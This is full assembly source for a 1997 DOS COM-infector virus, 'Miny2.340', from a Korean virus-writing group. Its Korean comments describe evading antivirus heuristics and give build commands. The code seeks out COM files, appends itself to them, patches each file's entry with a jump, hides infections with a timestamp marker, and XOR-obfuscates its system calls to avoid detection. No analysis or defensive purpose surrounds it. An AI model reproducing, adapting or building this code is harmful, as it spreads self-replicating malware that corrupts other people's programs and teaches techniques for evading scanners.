;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                                               CVC #02  97/09
; Virus Name : Miny2.340 (Type F)
; Author : Osiris
; Group : CVC (Corean Virus Club), Corea
; Date : 1997/08/25
;
; Type : Non-resident COM infector
;
; Miny2 (Type E) 의 개선판이다.
;
; 다음과 같은 점이 개선되었다.
;
;  F-prot 의 인공지능 검사에도 진단되지 않는다.
;  -> 생각보다 힘들었다. 일단 바이러스시작점 구하는 방식을 아예 없에 버렸고
;     COM 앞부분 복구하는것도 세그먼트조작으로 바꾸었다.
;
; AVP 970812,DSAV 7.73,F-PROT 2.72a,PCSCAN 315,SCAN 9708,TBAV 8.02,V3 : 진단 x
;
;
; 더이상 이 바이러스를 단순한 Miny2 의 아류작으로 보지 말았으면 한다.
; Type E 부터는 원형 Miny2 와는 전혀 다른 구조를 가지고 있다.
;
; TASM MINY2E      \
; TLINK MINY2E      >  실행 방법
; EXE2COM MINY2E   /
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

            .MODEL  TINY
            .CODE

 Miny2:     nop                         ; 쓰레기값 (아무일도 안한다.)
            nop                         ; 앞부분 복구시 바이러스가 파괴되기
            nop                         ; 때문에 이 값을 넣었다.
 start:
            mov   bp,100h               ; BP = 바이러스 시작점 - 3

            lea   si,COM_head[BP]       ; COM 앞부분 복구
            mov   ax,es                 ; F-prot 인공지능을 피하기 위해서
            add   ax,0010h              ; 세그먼트 조작
            mov   es,ax                 ; CS:100h 하고 ES+10h:0000 하고는 같다.
            xor   di,di                 ; DI=0
            movsw                       ; 앞부분 복구
            movsb                       ;
            mov   di,0FFh               ;
            inc   di                    ; DI=100h
            push  di                    ;
            push  cs                    ; cs=es
            pop   es

            mov   cx,0080h              ; DTA 로 사용해 PSP 내용 일부가 파괴
            mov   si,0080h              ; 되므로 잠시 저장한다.
            lea   di,End_Virus[BP]      ;
            repz  movsb

            mov   ah,(47h xor 49h)
            xor   dl,dl                 ; 옛 디렉토리 저장
            mov   si, BP
            add   si, offset OldDir + 1 ;
            mov   byte ptr OldDir[BP],'\'
            call  int21                 ;

            mov   byte ptr Count[BP],00 ; 감염카운터 0

 FindFirst:
            mov   ah,(4Eh xor 49h)      ; 파일 찾기
            mov   cx,00100011B          ; 파일 속성
            lea   dx,Match_COM[BP]      ; 찾고자 하는 파일 (*.c?m)
 Find:      call  Int21
            jc    ChgDir                ; 에러면 상위 디렉토리로 이동
            call  ChkInfected           ; 감염 루틴 호출
            cmp   byte ptr Count[BP],3  ; 3 개 감염 시켰나 ?
            jz    Restart               ; 그러면 감염 활동 끝
            mov   ah,(4Fh xor 49h)      ; 다음 파일 찾기
            jmp   Find

 ChgDir:    mov   ah,3Bh                ; 상위 디렉토리로 이동
            lea   dx, UP[BP]
            int   21h
            jnc   FindFirst             ; 상위로 이동했으면 다시 COM 찾기
 Restart:
            mov   ah,3Bh                ; 원래 디렉토리로 이동
            lea   dx, OldDir[BP]
            int   21h

            lea   si,End_Virus[BP]      ; 원래 DTA 복구
            mov   di,0080h
            mov   cx,0080h
            repz  movsb
            RET                         ; 원래 COM 파일 실행

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
; 실제 바이러스 감염 루틴
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 ChkInfected:                           ; 감염 여부를 확인한다.
            cmp   word ptr DS:[009Eh],'OC' ; COMMAND.COM 인가 ?
            jz    ErrorRtn
            mov   al,DS:[0096h]         ; 62 초 인지 검사한다.
            and   al,1Fh
            cmp   al,1Fh
            jnz   Infect
 ErrorRtn:  RET                         ; 62 초 이면 다음 파일 검사로 이어짐

 Infect:    mov   ax,(4301h XOR 4949h)  ; 읽기/쓰기 속성으로 바꿈
            xor   cx,cx
            mov   dx,009Eh
            call  Int21
            jc    ErrorRtn              ; 에러 발생

            mov   ax,(3D02h xor 4949h)  ; 파일 오픈
            call  Int21
            jc    ErrorRtn              ;

            xchg  ax,bx                 ; BX = 파일핸들

            mov   ax,(5700h XOR 49h)    ; 파일 작성 시간 얻기
            call  Int21
            push  cx                    ; 작성 시간 저장
            push  dx                    ;

            mov   ah,(3Fh XOR 49h)      ; 앞부분 읽기
            lea   dx,COM_Head[BP]       ; 버퍼 주소
            mov   cx,0003               ; 3 바이트
            call  Int21
            cmp   byte ptr COM_Head[BP],'M' ; MZ 인가 ?
            jnz   lseek2
            cmp   byte ptr COM_Head[BP+1],'Z'
            jz    Error
 lseek2:
            mov   al,02                 ; 파일 끝으로 이동
            call  lseek
            or    dx,dx                 ; 64 KB 이상인가 ?
            jnz   Error                 ; 다음 검사때 오픈 시키지 않기위해서

            sub   ax,3                  ; 점프값 계산
            mov   word ptr JumpCode[BP+1],ax     ;
            add   AX,100h               ; 파일끝 + 100h = 바이러스시작점 - 3
            mov   word ptr Start[BP+1],ax

            mov   ah,(40h XOR 49h)      ; 바이러스 쓰기
            mov   cx,offset (End_virus - start)
            lea   dx,start[BP]
            call  int21

            mov   al,00                 ; 처음으로 이동
            call  lseek

            mov   ah,(40h xor 49h)      ; 점프 코드 쓰기
            mov   cx,0003
            mov   byte ptr JumpCode[BP],0EAh
            dec   byte ptr JumpCode[BP] ; E9h = JMP
            lea   dx,JumpCode[BP]
            call  int21

            inc   byte ptr Count[BP]    ; 감염 갯수 증가
 Error:
            pop   dx                    ; 파일 작성 시간 복구
            pop   cx                    ;
            or    cx,+1Fh               ; 62 초로 만들기
            mov   ax,(5701h XOR 4949h)  ; 파일 작성 시간 복구
            call  Int21

            mov   ah,(3Eh XOR 49h)      ; 파일 닫기
            call  Int21
            RET

 lseek:                                 ; 포인터 이동
            xor   cx,cx
            xor   dx,dx
            mov   ah,40h                ; AH=42h
            inc   ah                    ;
            inc   ah
            int   21h
            ret

 Int21:                                 ; XOR 49h 연산후
            xor   ax,4949h              ; 인터럽트 21h 호출
            int   21h
            ret


 COM_head   db    0CDh,20h,90h          ; COM 앞부분
 Match_COM  db    '*.c?m',00            ; COM 파일 찾기
 Up         db    '..',00               ; 상위 디렉토리
            db    'Miny2'               ; 미니 2
            db    '(c) 1997 Osiris of CVC,Corea',00
 End_Virus:                             ; 실제 써지는 바이러스 끝


 Count      db    ?                     ; 감염 갯수
 JumpCode   db    ?,?,?                 ; 점프 값
 OldDir     db    ?                     ; 옛 디렉토리 저장 장소
            db    80h dup (0)
 OldDTA     db    80h dup (0)           ; 옛 DTA 내용 저장
            END   Miny2

